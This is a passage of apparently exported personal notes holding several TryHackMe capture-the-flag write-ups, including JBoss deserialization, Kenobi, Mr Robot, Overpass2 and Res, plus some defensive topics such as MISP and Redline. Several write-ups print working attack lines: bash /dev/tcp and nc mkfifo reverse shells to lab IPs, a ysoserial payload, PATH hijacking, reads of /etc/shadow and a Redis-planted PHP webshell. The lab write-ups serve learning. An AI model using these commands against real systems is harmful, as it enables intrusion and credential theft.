data](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html) *(indicated by the header `¬¨√≠sr` or `aced0005` in hex)*\n![[write-ups/images/Pasted image 20220819073421.png]]\nResearching this on the Internet I found [this awesome video](https://www.youtube.com/watch?v=lH2VNlf91pY) explaining in detail the vulnerability. Briefly speaking, here's what's happening\n- in `InvokerServlet.java` it uses the `readObject()` function to get serialized data from a `POST` request\n\t- ![[write-ups/images/Pasted image 20220819172710.png]]\n- investigating the `request` object further, we find that a method called `processRequest` handles it\n\t- ![[write-ups/images/Pasted image 20220819173015.png]]\n- now, the question is where does this function gets called. As it turns out, it's used by 2 primitives `doGet` \u0026 `doPost` *(those are used by the java application to properly map HTTP requests to methods)*\n\t- ![[write-ups/images/Pasted image 20220819173136.png]]\n- so the user-supplied `request` data is unfiltered \u0026 passed all the way down to `readObject()`. There's our [Deserialization Attack](Deserialization Attacks.md)\n- ok but how did we know the url path that maps to our vulnerable class *(i.e `InvokerServlet`)*. Well, java uses an XML file [web.xml](https://javabeat.net/web-xml/) to do the mapping between a class/object name and the URL endpoint\n- taking a look at this file we see how the servlet name `JMXInvokerServlet` is mapped to our vulnerable class\n\t- ![[write-ups/images/Pasted image 20220819173952.png]]\n\t- ![[write-ups/images/Pasted image 20220819174014.png]]\n- so at what endpoint can we find `JMXInvokerServlet` ?  \n\t- ![[write-ups/images/Pasted image 20220819174258.png]]\n- wait where's the `/invoker/` that we've seen in our Burp request ? Sometime java apps run multiple sub-applications or services under them. Which in our case, the one we're interested in is `jboss-service.xml`\n\t- ![[write-ups/images/Pasted image 20220819174621.png]]\n\n### jboss deserialization to RCE\nNow that we know where the actual vulnerable code is \u0026 where we can find it the [jexboss py](#Examining jexboss py) script makes more sense. We just need to `POST` a serialized java object on `/invoker/JMXInvokerServlet` that lets us execute code \u0026 gain control of the remote server. Luckily for us, we don't need to build the payload from scratch because there's tools such as [yssoserial](https://github.com/frohoff/ysoserial): *\"a collection of utilities and property-oriented programming \"gadget chains\" discovered in common java libraries that can, under the right conditions, exploit Java applications performing¬†**unsafe deserialization**¬†of objects\"*\n\nSince they found the gadgets which would allow us to execute code, we just need to figure out which library the app is using. Looking at the source-code, we find that it uses `common-collections:3.1`, so any of these would do the job. *(if we didn't know \u0026 were in a black-box scenario, we could just try everything and see what calls back)*\n![[write-ups/images/Pasted image 20220819175912.png]]\n\nTesting, with a `ping` payload \u0026 seending it with curl\n![[write-ups/images/Pasted image 20220819180735.png]]\nBOOM, it works. So now let's just spawn a reverse shell:\n```bash\nsudo docker run 7b65c331be9d CommonsCollections1 \"bash -i \u003e\u0026 /dev/tcp/10.18.12.227/1234 0\u003e\u00261\" | curl --proxy 127.0.0.1:8080 --data-binary @- http://10.10.79.0:8080/invoker/JMXInvokerServlet\n```\nBut nothing back... Hmm, maybe `CommonsCollections` doesn't like some of the special chars used. Let's try base64 encode our payload \u0026 use `bash` to decode / execute it.\n![[write-ups/images/Pasted image 20220819181506.png]]\n *(if confused about the `{}` notation check [this](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Command-Grouping))*\n\n## Privesc w `pingsys`\n - spawn stable shell with `pwncat-cs`: `bash -i \u003e\u0026 /dev/tcp/10.18.12.227/1234 0\u003e\u00261`\n - nothing in `mysql`\n\t - ![[write-ups/images/Pasted image 20220819081439.png]]\n - looked @ [[suid privesc|SUID files hoping for a privesc]]\n\t - ![[write-ups/images/Pasted image 20220819081529.png]]\n - the first item on the list is `pingsys` \u0026 when searched for it I found [this](https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux) stackeschange discussion about passing `argv[1]` to a custom `ping` C program that runs as root =\u003e we can abuse it by suplying a `; /bin/bash` ressulting in pinging \u0026 then executing a shell\n\t - ![[write-ups/images/Pasted image 20220819082136.png]]\n\t\n\n## Refs\n- [ysoserial](https://github.com/frohoff/ysoserial)\n- [hackerone: Java Deserialization RCEE](https://hackerone.com/reports/153026)\n\n## See Also\n- [[Deserialization Attacks]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/kenobi":{"title":"Kenobi","content":"\n## Recon\n\n![[write-ups/images/nmap_scan_kenobi.png]]\n\n### Enumerating SMB\nStarted with `enum4linux` or with `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.83.28`. That revealed an open share with anonymity login enabled which exposed a `log.txt` file. Tried getting it with  `smbget -U \"\" -R smb://10.10.83.28/anonymous`, but got this back:\n\n```bash\nCan't read 64000 bytes at offset 0, file smb://10.10.83.28/anonymous/log.txt\nFailed to download /log.txt: Connection timed out\n```\n\nA workaround for this is to mount locally \u0026 copy the content:\n\n```bash\nsudo mkdir /mnt/smbfs \u0026\u0026 sudo mount -t cifs //10.10.83.28/anonymous /mnt/smbfs -o username=none \u0026\u0026 cp /mnt/smbfs/log.txt .\n```\n\n![[write-ups/images/Pasted image 20220801215010.png]]\n\n### NFS\nWe see port `111` running the `rpcbind` service. From the [man page](https://www.man7.org/linux/man-pages/man8/rpcbind.8.html), we see that this service just converts remote procedure calls _(RPC)_ into universal addresses. To enumerate it I used nmap: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.83.28`\n\n```bash\nPORT    STATE SERVICE\n111/tcp open  rpcbind\n| nfs-showmount: \n|_  /var *\n```\n\n### FTP\nWe also have an FTP port open on `21` which runs ProFTPD 1.3.5. Running `searchsploit ProFTPD 1.3.5` we get\n\n![[write-ups/images/Pasted image 20220801131619.png]]\n\nSo we have an [RCE](https://packetstormsecurity.com/files/162777/ProFTPd-1.3.5-Remote-Command-Execution.html) by leveraging the `mod_copy` module, to get the script I ran: `searchsploit -m 36803`. Thus, we can use the `SITE CPFR` \u0026 `SITE CPTO` cmds to copy files/dirs from one place to another on the server =\u003e any unauthenticated client can leverage them to copy files from any part of the filesystem to a chosen destination\n\n## Getting user\nSince we have the open network file system in `/var` \u0026 we know that the FTP service is running as the `Kenobi` user *(from `log.txt`)* =\u003e we can leak Kenobi's SSH key\n\n![[write-ups/images/Pasted image 20220801131505.png]]\n\nThen just `chmod 700 id_rsa \u0026\u0026 ssh -i id_rsa kenobi@10.10.83.28`\n\n## Privilage Escalation\n- find `SUID`, `SGID` \u0026 `Sticky` binaries: `find / -perm -u=s -type f 2\u003e/dev/null`\n\t- ![[write-ups/images/Pasted image 20220801133918.png]]\n- we see the `menu` binary which is quite peculiar, so let's run it\n\t- ![[write-ups/images/Pasted image 20220801134008.png]]\n- it seems that it's just a helper script that let's us check the status of the web server, get the kernel version \u0026 run `ifconfig`. Let's do some more digging\n\t- ![[write-ups/images/Pasted image 20220801134236.png]]\n- we see that it uses `curl`, `uname` \u0026 `ifconfig`. However, it's not specifying a full path to the binary =\u003e we can hijack one of these programs by placing a copy in the `$PATH` before the original one \u0026 run whatever we want, so let's try it\n\t```bash\n\techo /bin/bash \u003e ifconfig\n\tchmod 777 ifconfig\n\tmkdir bin\n\tmv ifconfig bin\n\t```\n\t- ![[write-ups/images/Pasted image 20220801134826.png]]\n\n## Refs\n- [mod_copy module docs](http://www.proftpd.org/docs/contrib/mod_copy.html)\n- [HakTricks privesc linux](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/malware-intro":{"title":"Malware Intro","content":"\nWhen analysing malware it's important to consider the following:\n- Point of Entry *(PoE)*: how did the malware ended up on your network *(i.e through spam that our e-mail filtering missed \u0026 user opened an attachment? =\u003e review spam filters \u0026 train user better for future prevention)*\n- What are the indicators that malware has even been executed on a machine? *(e.g files, procs, attempt of \"un-ordinary\" comms)*\n- How does the malware perform? Does it attempt to infect other devices? Or encrypt files / install a backdoor/RAT\n- How can we ultimately prevent and/or detect further infection?!\n\n## Malware Campaigns\nAttacks can generally be classified into two types\n1. **Targeted**: malware attacks created for a specific purpose against a specific target *(e.g [DarkHotel](https://www.kaspersky.co.uk/resource-center/threats/darkhotel-malware-virus-threat-definition) malware - designed to steal information such as authentication details from government officials)*\n2. **Mass Campaign**: most common type of attacks, with the sole purpose of infecting as many devices as possible \u0026 perform whatever it may *(regardless of the target)*\n\t- companies such as [Kaspersky](https://www.kaspersky.it/) track these campaigns *(known as Advanced Persistent Threats - APTs)* \u0026 often report their infection rate/indicators of compromise *(IOCs)*\n\t- e.g [Crouching Yeti](https://www.kaspersky.co.uk/resource-center/threats/crouching-yeti-energetic-bear-malware-threat) campaign which targeted multiple industries *(e.g industrial, pharma, manufacturing, education, construction)*\n\n## Identifying Malware\n\nThe process of a malware attack can be broken down into a few broad steps:\n- **Delivery**: USB, PDF attachmnts through phishing campaigns, vulnerability enumeration\n- **Execution**: what does the malware actually do? *(encrypts files? =\u003e ransomware, records info such as keystrokes, video, audio =\u003e spyware, etc)*\n- **Persistence**: it wouldn't make sense for malware developers to spend so many resources just for it to execute once and that's it... gone =\u003e so persistance mechanisms are usually employed to maintain access to a compromised computer\n- **Propagation**: if it can infect 1 device, why not infect multiple *(maybe even create a botnet)*. Host discovery usually generates a lot of traffic\n\nThere are 2 main categories of fingerprints that malware might leave on a host after infection:\n1. **Host-Based Signatures**: the results of execution and any persistence *(e.g file encrypted? any additional software installed)*\n2. **Network-Based Signatures**: are the observation of any networking communication taking place during delivery, execution and propagation *(e.g ransomware: any payments commited to BTC addrs)*\n\n## Static VS Dynamic Analysis\n- **Static Analysis**: is used to gain a high-level abstraction of the sample. At its core, this method is of the analysis of the sample at the state it presents itself as, without executing the code\n- **Dynamic Analysis**: involves executing the sample and observing what happens. Usually done in a VM\n\n\n---\n\n## References\n\n## See Also\n- [[write-ups/thm/history-of-malware]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/misp":{"title":"MISP","content":"\n## MISP Overview\n\u003e Malware Information Sharing Platform is an open-source threat information platform that facilitates the collection, storage and distribution of threat intelligence and Indicators of Compromise (IOCs) related to malware, cyber attacks, financial fraud or any intelligence within a community of trusted members\n- threat info can be consumed by Network Intrustion Detection Systems *(NIDS)*, log analysis tools \u0026 Security Information and Event Management Systems *(SIEMs)*\n\n### Install local instance\n\n```bash\nwget -O /tmp/misp-kali.sh https://raw.githubusercontent.com/MISP/MISP/2.4/INSTALL/INSTALL.sh \u0026\u0026 bash /tmp/misp-kali.sh\n```\n\nOr with [docker-misp](https://github.com/MISP/docker-misp)\n\n### Use-Cases\n- **Malware Reverse Engineering**:¬†Sharing of malware indicators to understand how different malware families function.\n- **Security Investigations:**¬†Searching, validating and using indicators in investigating security breaches.\n- **Intelligence Analysis:**¬†Gathering information about adversary groups and their capabilities.\n- **Law Enforcement:**¬†Using indicators to support forensic investigations.\n- **Risk Analysis:**¬†Researching new threats, their likelihood and occurrences.\n- **Fraud Analysis:**¬†Sharing of financial indicators to detect financial fraud.\n### What does MISP support?\n- **IOC database:**¬†This allows for the storage of technical and non-technical information about malware samples, incidents, attackers and intelligence.\n- **Automatic Correlation:** Identification of relationships between attributes and indicators from malware, attack campaigns or analysis.\n- **Data Sharing:** This allows for sharing of information using different models of distributions and among different MISP instances.\n- **Import \u0026 Export Features:**¬†This allows the import and export of events in different formats to integrate other systems such as NIDS, HIDS, and OpenIOC.\n- **Event Graph:** Showcases the relationships between objects and attributes identified from events.\n- **API support:** Supports integration with own systems to fetch and export events and intelligence.\n\n### Terminology\n- **Events:** Collection of contextually linked information.\n- **Attributes:** Individual data points associated with an event, such as network or system indicators.\n- **Objects:** Custom attribute compositions.\n- **Object References:** Relationships between different objects.\n- **Sightings:** Time-specific occurrences of a given data point or attribute detected to provide more credibility.\n- **Tags:** Labels attached to events/attributes.\n- **Taxonomies:** Classification libraries are used to tag, classify and organise information.\n- **Galaxies:** Knowledge base items used to label events/attributes.\n- **Indicators:** Pieces of information that can detect suspicious or malicious cyber activity.\n\n---\n\n## References\n- [MISP project](https://www.misp-project.org/)\n- [MISP Docs](https://www.circl.lu/doc/misp/)\n- [Malware Traffic analysis.net](https://www.malware-traffic-analysis.net/index.html)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/mr-robot":{"title":"Mr Robot","content":"\n## Recon\n![[write-ups/images/Pasted image 20220823155358.png]]\n\n### Web Analysis\nIf we go to the home page of the website, there's some cool looking booting animation \u0026 then we have a lot of options to choose from\n![[write-ups/images/Pasted image 20220823160005.png]]\n\nGiven the box is themed around the [Mr Robot series](https://www.imdb.com/title/tt4158110/), it aludes to some of the show's topics \u0026 ideology, but nothing to helpfull for us. I ran `gobuster` in the background \u0026 decided to check out `robots.txt`, which revealed 2 files\n\n![[write-ups/images/Pasted image 20220823160356.png]]\n\nThere's our first flag + a potential wordlist for brute-forcing somebody's password.\n\nGoing back to `gobuster` we got quite some hits:\n![[write-ups/images/Pasted image 20220823160635.png]]\n\n## From wordpress credentials to RCE\nSeems that it runs WordPress =\u003e ran `wpscan` in the background. While that ran I wanted to check if I could use `xmlrpc.php` to [[|brute-force credentials]] =\u003e send this req with Burp\n![[write-ups/images/Pasted image 20220823161415.png]]\nNow I was looking for any of the following methods in the response: `wp.getUserBlogs`, `wp.getCategories` or `metaWeblog.getUsersBlogs`. A faster way to brute-force credentials is using `system.multicall` as we can try several credentials on the same request *(if confused, see [[Attacking Wordpress]])*\n\nSo yeah we could make `wpscan` do the work for us \u0026 run a brute-force attack *(since the theme is mr robot I figured the name should be elliot)*: `wpscan -P fsocity.dic -U elliot --password-attack xmlrpc-multicall --url http://10.10.13.131/`\n\nI still haven't look at all the results from `gobuster`, so I tinkered through them \u0026 found a peculiar endpoint: `/license`:\n```\nwhat you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?\n.... \u003c some random data\u003e ....\ndo you want a password or something?\n.... \u003c more random data\u003e ....\nZWxsaW90OkVSMjgtMDY1Mgo=\n```\nOk.. let's try base64 decode this?\n\n![[write-ups/images/Pasted image 20220823162623.png]]\n\nAnd we got the user \u0026 password üòÜ without brute-forcing. However, we could have a look and see if the pass was in our dictionary: `cat fsocity.dic| grep ER28-0` which it is, so the attack would be successfull.\n\nNow that we're in the WordPress dashboard we can go to `Appearance -\u003e Editor -\u003e 404 Template` \u0026 replace it with a [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Then save \u0026 navigate to a random nonexistent page to trigger our payload\n![[write-ups/images/Pasted image 20220823163301.png]]\n\nNow that we got a shell, let's do some basic enumeration.\n\n![[write-ups/images/Pasted image 20220823163814.png]]\n\nWe can't read the 2nd flag since we're not the `robot` user, but we have it's md5 password hash. Plugging it in [crackstation](https://crackstation.net/) reveals it: `abcdefghijklmnopqrstuvwxyz`. Consequently, we can now switch to the `robot` user: \n```bash\nsu robot\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.18.12.227 1337 \u003e/tmp/f\n```\n\n## Classic SUID privesc\nLooking @ the suid files:\n\n![[write-ups/images/Pasted image 20220823164832.png]]\n\nWe find [nmap](https://gtfobins.github.io/gtfobins/nmap/) which can be started in `--interactive` mode \u0026 be used to exeecute shell commands:\n![[write-ups/images/Pasted image 20220823165000.png]]\n\n\n## Refs\n- [WordPress Haktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)\n\n## See Also\n- [[Attacking Wordpress]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/openvas":{"title":"OpenVAS","content":"\n## Write-up\n- Install: `docker run -d -p 443:443 --name openvas mikesplain/openvas`\n- IMG of report\n\n- **Scenario**: you are assigned to a routine vulnerability management pipeline as a SOC analyst. Your automated pipeline has already pulled a scan on the server, it is up to you to analyze and identify risk in this report.\n### Answers\n- When did the scan start in Case 001?\n\t- Feb 28, 00:04:46\n- When did the scan end in Case 001?\n\t- Feb 28, 00:21:02\n- How many ports are open in Case 001?\n\t- 3\n- How many total vulnerabilities were found in Case 001?\n\t- 5\n- What is the highest severity vulnerability found? (MSxx-xxx)\n\t- MS17-010\n- What is the first affected OS to this vulnerability?\n\t- Microsoft Windows 10 x32/x64 Edition\n- What is the recommended vulnerability detection method?\n\t- Send the crafted SMB transaction request with fid = 0 and check the response to confirm the vulnerability\n\n\n---\n\n## References\n- [THM room](https://tryhackme.com/room/openvas)\n- [About GVM 10 Arch](https://community.greenbone.net/t/about-gvm-10-architecture/1231)\n- [Greenbone](https://www.greenbone.net/) \u0026 [github](https://github.com/greenbone)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/overpass-2-hacked":{"title":"Overpass2 (hacked)","content":"\n## Analysing the PCAP of our threat actor\n- filtered by `HTTP`\n\t- ![[write-ups/images/Pasted image 20220823180028.png]]\n\t- taking a look @ what was uploaded we see a php script spawning a reverse shell on port `4242`\n\t\t- ![[write-ups/images/Pasted image 20220823180114.png]]\n\t\t- `\u003c?php exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 192.168.170.145 4242 \u003e/tmp/f\")?\u003e`\n- filtered by ip \u0026 port to see what the attacker has done once he got initial access: `ip.addr == 192.168.170.145 \u0026\u0026 tcp.port eq 4242`\n\t```bash\n\t# see who he's logged in as + shell stabilize\n\t\u003e id\n\t\u003e python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\t# some dir listing \u0026 he cats .overpass?\n\t\u003e ls -lAh\n\t-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass\n\t-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php\n\t\u003e cat .overpass\n\t# then switches to the james user\n\t\u003e su james\n\tPassword: whenevernoteartinstant\n\t# checks what can be ran as root\n\t\u003e sudo -l\n\tMatching Defaults entries for james on overpass-production:\n\t\tenv_reset, mail_badpass,\n\t\tsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\tUser james may run the following commands on overpass-production:\n\t\t(ALL : ALL) ALL\n\t# dumps /etc/shadow \u0026 estaablihes persistence with an ssh backdoor\n\t\u003e sudo cat /etc/shadow\n\t\u003e git clone https://github.com/NinjaJc01/ssh-backdoor\n\t\u003e cd ssh-backdoor \u0026\u0026 ssh-keygen\n\t\u003e chmod +x backdoor\n\t\u003e ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed\n\t```\n\t- he dumped the `/etc/shadow` file, let's see if we can crack some of the passwords ourselves\n\t- ![[write-ups/images/Pasted image 20220823183200.png]]\n## Looking @ the backdoor\nGetting a local copy of the backdoor is trivial: `git clone https://github.com/NinjaJc01/ssh-backdoor.git`. Now we can look @ the source code in `main.go`:\n- What's the default hash for the backdoor?\n\t- ![[write-ups/images/Pasted image 20220823183523.png]]\n- What's the hardcoded salt for the backdoor?\n\t- ![[write-ups/images/Pasted image 20220823183533.png]]\n- What was the hash that the attacker used? - go back to the¬†PCAP¬†for this!\n\t- as we've previously seen the attacker used the `-a` tag to specify a custom hash for the backdoor\n\t- ![[write-ups/images/Pasted image 20220823183624.png]]\n- Crack the hash using rockyou and a cracking tool of your choice. What's the password?\n\t- we know the hash \u0026 the salt so safe them into a file formatted as `hash:salt`\n\t- ![[write-ups/images/Pasted image 20220823183835.png]]\n\t- now pass it to `hashcat` \u0026 grab a coffee\n\t- ![[write-ups/images/Pasted image 20220823185520.png]]\n\n\n## The Blue Team Attacks Back\nNavigating to the web server we see that he had some fun\n![[write-ups/images/Pasted image 20220823191014.png]]\n\nNow nmap shows us aan additional port `2222` that runs ssh, that's the backdoor we previously seen\n\n![[write-ups/images/Pasted image 20220823191047.png]]\n\nGiven that we know the password, let's try to ssh:\n![[write-ups/images/Pasted image 20220823191118.png]]\n\nUm.... ok it seems that we need to change the `HostkeyAlgorithms` option to [workaround](https://github.com/gitblit/gitblit/issues/1384) this:\n![[write-ups/images/Pasted image 20220823191324.png]]\n\nNow trying to run `sudo -l` with any of the previously shown passwords didn't work. So I started looking around \u0026 found this peculiar file `.suid_bash`:\n\n![[write-ups/images/Pasted image 20220823191624.png]]\n\nExecuting this [[SUID]] file it should give us an easy way to root. With the help of [GTFObins](https://gtfobins.github.io/gtfobins/bash/) we're back in boys, ready to kick the attacker out of the box \u0026 restore functionality *(probably better hardening the system after this eventüòÖ)*\n\n![[write-ups/images/Pasted image 20220823191926.png]]\n\n## Refs\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/post-exploitation-basics":{"title":"Post Exploitation Basics (Windows)","content":"\n## PowerView Enumeration\n- start PS with bypass the exec policy *(allows to easily run scripts)*: `powershell -ep bypass`\n- load PowerView: `. .\\Downloads\\PowerView.ps1`\n- enumerate domain users: \n\t- ![[write-ups/images/Pasted image 20220801141016.png]]\n- enumerate domain groups: \n\t- ![[write-ups/images/Pasted image 20220801141051.png]]\n- get network shares \u0026 computer data:\n\t- ![[write-ups/images/Pasted image 20220801141454.png]]\n- for more check out this [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)\n\n## BloodHound Mapping/Enumeration\n[BloodHound](https://bloodhound.readthedocs.io/en/latest/index.html) allows to visually map out a Windows network. Along with [SharpHound](https://github.com/BloodHoundAD/SharpHound), similar to [PowerView](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html), it's a data collector to retrieve users, groups, trusts, etc \u0026 store them into a `.json` file\n\n![[write-ups/images/Pasted image 20220801142132.png]]\n\n\u003e **NOTE**: I needed to downgrade to [BloodHound 3.0](https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.5) in order to import the `loot.zip` generated. That's because the VM on THM is using an older version of SharpHound (see [this issue](https://github.com/BloodHoundAD/BloodHound/issues/516)) \n\nImport the `loot.zip` into BloodHound \u0026 now we can explore the Windows infrastructure\n![[write-ups/images/Pasted image 20220801144554.png]]\n- we have pre-build queries @ our disposal. We can do things like `shortest path to domin admin`\n\t- ![[write-ups/images/Pasted image 20220801144649.png]]\n\n## Mimikatz dumping\n![[write-ups/images/Pasted image 20220801144900.png]]\n\nCrack `Machine1` password:\n![[write-ups/images/Pasted image 20220801145144.png]]\n\n### Golden Ticket Attack\n- dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network\n\t- ![[write-ups/images/Pasted image 20220801150104.png]]\n- create the golden ticket\n\t- ![[write-ups/images/Pasted image 20220801151001.png]]\n- access any machine on the network !\n\t- `misc::cmd`: open a new shell with elevated privileges to all machines\n\n\n## Enum w Server Manager\n- connect to the machine: `xfreerdp /v:10.10.206.240 /u:Administrator`\n- ![[write-ups/images/Pasted image 20220801151836.png]]\n- under `Tools \u003e Active Directory Users \u0026 Computers` will give us more info\n\t- ![[write-ups/images/Pasted image 20220801151917.png]]\n- some sys admins don't realize that anyone else can be looking in the desscription of user accounts =\u003e we now have the SQLService password\n\n## Refs\n- [PowerSploit docs](https://powersploit.readthedocs.io/en/stable/Recon/README/)\n- [https://blog.harmj0y.net/](https://blog.harmj0y.net/)[](https://blog.harmj0y.net/)\n- [https://adsecurity.org/?page_id=1821](https://adsecurity.org/?page_id=1821)[](https://adsecurity.org/?page_id=1821)\n- [https://metasploit.help.rapid7.com/docs/about-post-exploitation](https://metasploit.help.rapid7.com/docs/about-post-exploitation)  \n- [http://www.pentest-standard.org/index.php/Post_Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)\n- [https://offsec.red/mimikatz-cheat-sheet/](https://offsec.red/mimikatz-cheat-sheet/)[](https://offsec.red/mimikatz-cheat-sheet/)\n- [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/redline":{"title":"Redline","content":"\n## Standard Collector Analysis\n\n- What is the suspicious scheduled task that got created on the victim's computer?\n\t- ![[write-ups/images/Pasted image 20220628184747.png]]\n- Find the message that the intruder left for you in the task.\n\t- `THM-p3R5IStENCe-m3Chani$m`\n- There is a new System Event ID created by an intruder with the¬†source name \"THM-Redline-User\" and¬†the Type \"ERROR\". Find the Event ID # + Provide the message for the Event ID.\n\t- ![[write-ups/images/Pasted image 20220628185056.png]]\n\t- `546` / `Someone cracked my password. Now I need to rename my puppy-++-`\n- It looks like the intruder downloaded a file containing the flag for Question 8. Provide the full URL of the website + Provide the full path to where the file was downloaded to including the filename.\n\t- ![[write-ups/images/Pasted image 20220628185334.png]]\n- Provide the message the intruder left for you in the file.\n\t- navigate to `C:\\Program Files (x86)\\Windows Mail\\SomeMailFolder\\flag.txt` locally \u0026 open the file =\u003e `THM{600D-C@7cH-My-FR1EnD}`\n\n## IOC Search Collector Analysis\n- [OpenIOC Editor](https://fireeye.market/apps/211404)¬†by FireEye\n\n- **Scenario**: You are assigned to do a threat hunting task at Osinski Inc. They believe there has been an intrusion, and the malicious actor was using the tool to perform the lateral movement attack, possibly a¬†[\"pass-the-hash\" attack](https://secureteam.co.uk/articles/information-assurance/what-is-a-pass-the-hash-attack/).\n\t- **Task**: Can you find the file planted on the victim's computer using¬†IOC¬†Editor and Redline IOC Search Collector?\n\t- **File Strings:**¬†\n\t\t- `20210513173819Z0w0=`\n\t\t- `\u003c?\u003cL\u003cT\u003cg=`\n\t- **File Size (Bytes)**:\n\t\t- 834936\n- create a new IOC:\n\t- ![[write-ups/images/Pasted image 20220629182217.png]]\n- open `C:\\Users\\Administrator\\Documents\\Analysis\\Sessions\\AnalysisSession1` in Redline \u0026 run an IOC report with the created file\n\t- ![[write-ups/images/Pasted image 20220629181805.png]]\n- plug the MD5 hash into virustotal\n\t- ![[write-ups/images/Pasted image 20220629181834.png]]\n- answers\n\t- ![[write-ups/images/Pasted image 20220629181854.png]]\n\n## Endpoint Investigation\n**Scenario**: A Senior Accountant, Charles, is complaining that he cannot access the spreadsheets and other files he has been working on. He also mentioned that his wallpaper got changed with the saying that his files got encrypted. This is not good news!\n\n- Find the Windows Defender service; what is the name of its service DLL?\n\t- in `Windows Services`\n\t- ![[write-ups/images/Pasted image 20220629183232.png]]\n- The user manually downloaded a zip file from the web. Can you find the filename?\n\t- \n- Provide the filename of the malicious executable that got dropped on the user's Desktop.\n\t- `File system` \u0026 filter by `charles -\u003e Desktop`\n\t- ![[write-ups/images/Pasted image 20220629184540.png]]\n- Provide the MD5 hash for the dropped malicious executable.\n\t- ![[write-ups/images/Pasted image 20220629184638.png]]\n- What is the name of the ransomware?\n\t- [cerber](https://blog.malwarebytes.com/threat-analysis/2016/03/cerber-ransomware-new-but-mature/)\n\n---\n\n## References\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/res":{"title":"Res","content":"\n## Recon\n- `nmap -sC -sV -oN scan.txt \u003cip\u003e`\n\t- ![[write-ups/images/Pasted image 20220808101035.png]]\n- While checking the website, I ran an all-port scan in the background: `nmap -p- \u003cip\u003e`\n\t- ![[write-ups/images/Pasted image 20220808101129.png]]\n- Nothing much, just a default apache web server. I let `gobuster` run in the background. \n- Meanwhile, the other nmap scan found a new port\n\t- ![[write-ups/images/Pasted image 20220808101301.png]]\n- A `redis` service, since the name of this box is `res` I expected to find something by poking around this service\n\n### Redis Enumeration\n\u003e **What is Redis?**\n\u003e It's an open-source, in memory data structure store, used as a database, cache \u0026 message broker *(from [their website](https://redis.io/docs/about/))*\n- The version seems to be up to date *(`6.0.7`)*\n- Let's connect manually to the service: `redis-cli -h \u003cip\u003e`\n\t- no auth required... ok\n\t- get more info \u0026 dump config file\n```bash\nINFO\n[ ... Redis response with info ... ]\nclient list\n[ ... Redis response with connected clients ... ]\nCONFIG GET *\n[ ... Get config ... ]\n```\n\n## Redis RCE with PHP\n- Since we know the **path** of the web site folder *(`var/www/html`)*, the first question is if we can write files there using redis. Turns out [you can](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html) by leveraging [CONFIG SET](https://redis.io/commands/config-set/) to choose where we want to write \u0026 [SET](https://redis.io/commands/set/) to write our content as a [key](https://redis.io/commands/keys/).\n\t- ![[write-ups/images/Pasted image 20220808103318.png]]\n- Then just navigate to `http://\u003cip\u003e/redis.php?c=\u003ccmd\u003e` \u0026 execute whatever you want üòã\n\t- ![[write-ups/images/Pasted image 20220808103515.png]]\n\t- ![[write-ups/images/Pasted image 20220808124224.png]]\n\n## Getting root\n- I started by searching for any SUID binaries: \n\t- ![[write-ups/images/Pasted image 20220808124425.png]]\n- with a quick look on [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/) we find that we can use `xxd` to read/write files as root\n\t```bash\n\t# Get the root flag\n\tLFILE=\"/root/root.txt\" \u0026\u0026 xxd \"$LFILE\" | xxd -r\n\t# Retrieve /etc/shadow\n\tLFILE=\"/etc/shadow\" \u0026\u0026 xxd \"$LFILE\" | xxd -r\n\t```\n\n### Cracking `/etc/shadow`\nOnce `/etc/shadow` \u0026 `/etc/passwd` are dumped you need to combine them in a format that `john` understands. For that we have the [unshadow](https://www.commandlinux.com/man-page/man8/unshadow.8.html) utiltiy\n\n![[write-ups/images/Pasted image 20220808125234.png]]\n\n### Hijack `/etc/shadow` to set root password\nAt this point, 